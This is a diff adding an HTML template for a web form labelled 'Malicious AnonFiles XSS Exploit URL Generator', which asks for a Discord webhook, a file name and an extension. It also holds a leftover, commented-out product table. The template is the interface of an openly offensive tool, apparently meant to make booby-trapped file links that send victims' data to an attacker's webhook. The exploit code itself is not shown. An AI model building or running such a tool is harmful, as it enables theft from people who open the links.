@@ -1,0 +1,75 @@
+<html>
+
+<head>
+    <title>AnonFiles XSS Generator</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+</head>
+
+<body>
+
+    {% if "Success" in alert  %}
+        <div class="alert alert-success" role="alert">{{alert}}</div>
+    {% elif "Failed" in alert %}
+        <div class="alert alert-danger" role="alert">{{alert}}</div>
+    {% endif %}
+
+    <div class="header" style="padding-left: 100; padding-right: 100; padding-top: 80;">
+        <h3>Malicious AnonFiles <mark>XSS Exploit</mark> URL Generator</h3>
+        {% if "anonfiles" in url %}
+            <h3>Latest URL: <mark>{{url}}</mark></h3>
+        {% endif %}
+    </div>
+
+    <form method="POST" action="{{url_for('generate_url')}}" id="generation_form">
+        <div class="form-group" style="padding-left: 100; padding-right: 100; padding-top: 50;">
+            <label for="productname">Discord Webhook</label>
+            <input type="text" class="form-control" name="discordwebhook" placeholder="discord webhook url" autocomplete="off">
+        </div>
+        <div class="form-group" style="padding-left: 100; padding-right: 100;">
+            <label for="filename">File Name</label>
+            <input type="text" class="form-control" name="filename" placeholder="file name" autocomplete="off">
+        </div>
+        <div class="form-group" style="padding-left: 100; padding-right: 100;">
+            <label for="filextension">File Extension</label>
+            <input type="text" class="form-control" name="filextension" placeholder="file extension (ex. txt, pdf, exe, etc.)" autocomplete="off">
+        </div>
+        <div class="form-group" style="padding-left: 100px; padding-right: 80; padding-top: 20;">
+            <button type="submit" class="btn btn-primary">Generate URL</button>
+        </div>
+    </form>
+
+    <!-- <div id="listings" style="padding-left: 100px; padding-right: 100px; padding-top: 30px; padding-bottom: 80px;">
+        <table class="table" id="table_to_sort">
+            <thead class="thead-dark">
+                <tr>
+                    <th scope="col">#</th>
+                    <th scope="col">Product Name</th>
+                    <th scope="col">Product Price</th>
+                    <th scope="col">Manage</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for i, product in sorted %}
+                <tr>
+                    <th scope="row">{{i+1}}</th>
+
+                    <form method="POST" action="{{url_for('edit_product_name', name=product.name)}}" id="editnameinput">
+                        <td><input style="width: 200px;" type="text" class="form-control" name="new_name" value={{product.name}} autocomplete="off"></td>
+                    </form>
+
+                    <td>£{{product.price|round(2)}}</td>
+                    <td>
+                        <form action="{{ url_for('remove_product', name=product.name) }}" method="POST" id="delete-form">
+                            <button class="btn btn-danger" id="deleteproduct" type="submit">Delete</button>
+                            <button class="btn btn-primary" form="editnameinput" type="submit">Edit</button>
+                        </form>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div> -->
+
+</body>
+
+</html>
